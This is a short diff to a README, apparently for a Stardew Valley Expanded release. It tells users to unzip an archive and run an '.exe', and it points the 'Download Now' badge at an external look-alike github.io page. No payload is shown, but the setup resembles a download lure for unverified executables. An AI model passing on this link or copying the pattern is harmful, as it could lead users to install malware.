@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://stardew-valley-expanded.github.io/.github/)
 
 ## 📸 Overview
 ![sve-new-characters](https://github.com/user-attachments/assets/943d1c3a-e126-4074-83a7-54618e46f3f4)
